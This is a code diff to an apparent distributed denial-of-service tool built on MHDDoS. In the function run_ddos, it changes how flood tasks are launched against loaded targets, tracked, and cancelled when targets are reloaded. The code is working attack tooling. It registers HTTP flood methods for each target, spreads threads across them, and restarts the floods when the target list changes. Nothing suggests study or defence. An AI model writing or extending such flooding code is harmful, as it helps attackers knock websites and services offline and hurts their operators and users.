@@ -149,8 +149,7 @@ async def run_ddos(
         # Keep the docs/info on-screen for some time before outputting the logger.info above
         await asyncio.sleep(5)
 
-    #flooders = [Flooder(switch_after) for _ in range(total_threads)]
-    #udp_tasks = []
+    flooders = []
 
     async def load_targets():
         targets, changed = await targets_loader.load()
@@ -158,10 +157,18 @@ async def run_ddos(
         return [target for target in targets if target.is_resolved], changed
 
     async def install_targets(targets):
-        #nonlocal udp_tasks
+        nonlocal flooders
+
+        # cancel running flooders
+        if flooders:
+            for task in flooders:
+                task.cancel()
+            flooders = []
+
         # XXX: looks like a hack
         for k in list(statistics):
             del statistics[k]
+
         kwargs_list, udp_kwargs_list = [], []
         for target in targets:
             assert target.is_resolved, "Unresolved target cannot be used for attack"
@@ -179,12 +186,14 @@ async def run_ddos(
                 for method in http_methods:
                     register_params(Params(target, method), kwargs_list)
             else:
-                raise ValueError(f"Unsupported scheme given: {target.url.scheme}")
-        
+                logger.error(f"Unsupported scheme given: {target.url.scheme}")
+
         scale = total_threads // len(kwargs_list)
-        
+
         for kwargs in kwargs_list:
-            asyncio.create_task(FloodTask(mhddos_async_main(**kwargs), scale).loop())
+            task = asyncio.create_task(FloodTask(mhddos_async_main(**kwargs), scale).loop())
+            # XXX: add stats for running/cancelled tasks with add_done_callback
+            flooders.append(task)
 
         return
 
@@ -216,7 +225,7 @@ async def run_ddos(
         exit()
     await install_targets(initial_targets)
 
-    tasks = [] #[asyncio.ensure_future(f.loop()) for f in flooders]
+    tasks = []
 
     async def stats_printer():
         refresh_rate = 5
